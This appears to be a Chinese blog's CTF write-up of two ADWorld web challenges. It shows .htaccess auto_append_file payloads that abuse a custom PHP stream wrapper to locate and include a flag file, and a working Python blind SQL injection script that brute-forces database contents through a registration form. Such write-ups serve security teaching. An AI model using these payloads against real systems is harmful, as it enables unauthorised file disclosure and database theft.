@@ -1,0 +1,420 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>攻防世界 ADWorld Web 部分题解（2） | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="攻防世界 ADWorld Web 部分题解（2） | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="0x01 blgdel
+CISCN-2018-Final
+目录扫描发现存在 robots.txt、sql.txt 等文件，robots.txt 内容为：Disallow: /config.txt .
+
+config.txt
+
+&lt;?ph..." />
+    <meta name="keywords" content="Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              攻防世界 ADWorld Web 部分题解（2）
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-10-07
+              </span>
+              <span>
+                6 min read
+              </span>
+              <span class="page-view" key="20191007001006" title="攻防世界 ADWorld Web 部分题解（2）">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <h2 id="0x01-blgdel">0x01 blgdel</h2>
+<p>CISCN-2018-Final</p>
+<p>目录扫描发现存在 robots.txt、sql.txt 等文件，robots.txt 内容为：Disallow: /config.txt .</p>
+<ul>
+<li>config.txt</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+class master {
+	private $path;
+	private $name;
+	
+	function __construct(){}
+
+	function stream_open($path) {
+		if(!preg_match('/(.*)\/(.*)$/s',$path,$array,0,9)) return 1;
+		$a =$array[1];
+		parse_str($array[2], $array);
+		
+		if(isset($array['path'])) {
+			$this-&gt;path=$array['path'];
+		}
+		else return 1;
+		if(isset($array['name'])) {
+			$this-&gt;name=$array['name'];
+		}
+		else return 1;
+	
+		if($a==='upload') {
+			return $this-&gt;upload($this-&gt;path, $this-&gt;name);
+		}
+		elseif($a==='search') {
+			return $this-&gt;search($this-&gt;path,$this-&gt;name);
+		}
+		else return 1;
+	}
+	function upload($path,$name) {
+		if(!preg_match('/^uploads\/[a-z]{10}\/$/is',$path)||empty($_FILES[$name]['tmp_name']))
+			return 1;
+		
+		$filename=$_FILES[$name]['name'];
+		echo $filename;
+		
+		$file=file_get_contents($_FILES[$name]['tmp_name']);
+		
+		$file=str_replace('&lt;','!',$file);
+		$file=str_replace(urldecode('%03'),'!',$file);
+		$file=str_replace('&quot;','!',$file);
+		$file=str_replace(&quot;'&quot;,'!',$file);
+		$file=str_replace('.','!',$file);
+		if(preg_match('/file:|http|pre|etc/is',$file)) {
+			echo 'illegalbbbbbb!';
+			return 1;
+		}
+		
+		file_put_contents($path.$filename,$file);
+		file_put_contents($path.'user.jpg',$file);
+		
+		echo 'upload success!';
+		return 1;
+	}
+	function search($path,$name) {
+		if(!is_dir($path)) {
+			echo 'illegal!';
+			return 1;
+		}
+		$files=scandir($path);
+		echo '&lt;/br&gt;';
+		foreach($files as $k=&gt;$v) {
+			if(str_ireplace($name,'',$v)!==$v) {
+				echo $v.'&lt;/br&gt;';
+			}
+		}
+		return 1;
+	}
+	
+	function stream_eof() {
+		return true;
+	}
+	function stream_read() {
+		return '';
+	}
+	function stream_stat() {
+		return '';
+	}
+	
+}
+
+stream_wrapper_unregister('php');
+stream_wrapper_unregister('phar');
+stream_wrapper_unregister('zip');
+stream_wrapper_register('master','master');
+
+?&gt;
+</code></pre>
+<ol>
+<li>
+<p>config.php 中注册了自定义的 master 协议处理器，同时禁用了 PHP、Phar、Zip等伪协议。</p>
+</li>
+<li>
+<p>upload() 函数中对上传文件的内容进行了过滤，过滤了<code>&lt;</code>、<code>&quot;</code>、<code>'</code>和<code>.</code>等字符，统一替换为 <code>!</code>，同时黑名单正则匹配过滤了文件中 <code>file:</code>、<code>http</code>、<code>pre</code>、<code>etc</code>等关键字。</p>
+</li>
+<li>
+<p>结合 config.php 内容以及 upload()函数对上传文件内容中 <code>pre</code> 关键字的过滤，猜测用户上传文件目录默认包含了 config.php (<code>php_value auto_prepend_file config.php</code>).</p>
+</li>
+</ol>
+<ul>
+<li>sql.txt</li>
+</ul>
+<pre><code class="language-sql">CREATE DATABASE `sshop` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;
+USE `sshop`;
+CREATE TABLE `sshop`.`users` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `username` varchar(255) NULL DEFAULT NULL,
+  `mail` varchar(255) NULL DEFAULT NULL,
+  `password` varchar(255) NULL DEFAULT NULL,
+  `point` varchar(255) NULL DEFAULT NULL,
+  `shopcar` varchar(255) NULL DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
+</code></pre>
+<p><code>User.php</code> 头像上传处可上传任意文件（需满足用户积分 &gt;= 100，可通过邀请用户注册获取积分，每成功注册一名用户邀请人将获取 10 积分，注册10个用户邀请人统一填写统一用户即可集齐 100 积分）。</p>
+<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191007002644.png" alt="" loading="lazy"></figure>
+<p>考虑升级 文件上传漏洞为 <strong>文件上传 + 文件包含</strong>，结合 config.php 的相关限制（无法替换 auto_prepend_file 从而使用PHP、Phar、Zip伪协议）以及无法进行远程文件包含，则将目光放在新注册的 <code>master</code> 伪协议上。</p>
+<p>分析协议的构成，发现如果我们可以控制协议，则可以给 <strong>任意目录上传/搜索文件</strong>，而协议流程和对象注入差不多，先是执行 __construct 再是 stream_open,upload/search, stream_read... 主要是 upload 和 search，其余方法都做了处理，可以不管。</p>
+<p>上传目录被限制了，我们可以搜索文件。通过上传特定内容的 <code>.htaccess</code>，可以实现在任意目录下搜索文件：</p>
+<pre><code class="language-php">php_value auto_append_file master://search/path={}&amp;name={} # 此时注意 / 要替换为 %2f
+</code></pre>
+<p>搜索结果可以通过上传并访问一个 1.php 看到 通过几次简单测试，可以得到在如下 payload 时获取到 <code>hiahiahia_flag</code> 文件：</p>
+<pre><code class="language-php">php_value auto_append_file master://search/path=%2fhome%2f&amp;name=flag
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191007010459.png" alt="" loading="lazy"></figure>
+<p>此时我们再上传一个 <code>.htaccess</code>，内容为 <code>php_value auto_append_file /home/hiahiahia_flag</code> 即包含 flag，再访问 1.php，即可获取到 flag。</p>
+<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191007010618.png" alt="" loading="lazy"></figure>
+<h2 id="0x02-flask_sqli">0x02 Flask_SQLi</h2>
+<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191021000729.png" alt="" loading="lazy"></figure>
+<p>基于 Flask 框架开发的一个 Microblog，题目给出了 Web 应用程序源代码，下载源码进行审计。</p>
+<p>查看注册框架 <code>RegistrationForm</code> 对注册邮箱过滤不严格：</p>
+<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191021001150.png" alt="" loading="lazy"></figure>
+<p>跟进 <code>validate_email</code> 函数:</p>
+<pre><code class="language-python">validate_email() -&gt; Mysql.One -&gt; Mysql.Sel
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191021001553.png" alt="" loading="lazy"></figure>
+<p>拼接 SQL 查询语句如下：</p>
+<pre><code class="language-sql">select id from user where email = 'your_input_email'
+</code></pre>
+<p>如果注册邮箱已存在则返回 Please use a different email address. 可构造出如下 payload 进行 SQL盲注：</p>
+<pre><code class="language-sql">select id from user where email = 'test'/**/or/**/1=1#/**/@3ND.com'
+</code></pre>
+<p>附 exp 如下：</p>
+<pre><code class="language-python">import requests
+from bs4 import BeautifulSoup
+
+url = &quot;http://111.198.29.45:53260/register&quot;
+
+r = requests.get(url)
+soup = BeautifulSoup(r.text, &quot;html5lib&quot;)
+token = soup.find_all(id='csrf_token')[0].get(&quot;value&quot;)
+
+notice = &quot;Please use a different email address.&quot;
+result = &quot;&quot;
+
+database = &quot;(SELECT/**/GROUP_CONCAT(schema_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)&quot;
+tables = &quot;(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())&quot;
+columns = &quot;(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)&quot;
+data = &quot;(SELECT/**/GROUP_CONCAT(flag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flag)&quot;
+
+
+for i in range(1, 100):
+    for j in range(32, 127):
+        payload = &quot;test'/**/or/**/ascii(substr(%s,%d,1))=%d#/**/@3ND.com&quot; % (database, i, j)
+        post_data = {
+            'csrf_token': token,
+            'username': '3ND',
+            'email':payload,
+            'password':'3ND',
+            'password2':'3ND',
+            'submit':'Register'
+        }
+        r = requests.post(url, post_data)
+        soup = BeautifulSoup(r.text,&quot;html5lib&quot;)
+        token = soup.find_all(id='csrf_token')[0].get(&quot;value&quot;)
+        if notice in r.text:
+            result += chr(j)
+            print result
+            break
+</code></pre>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-blgdel">0x01 blgdel</a></li>
+<li><a href="#0x02-flask_sqli">0x02 Flask_SQLi</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-10-26-2019-anhengbei-first/">
+                <h3 class="post-title" style="text-align: left;">
+                  2019 全国大学生软件测试大赛预选赛
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-10-06-adworld-web-php-wrong-nginx-config/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  攻防世界 Web_php_wrong_nginx_config
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
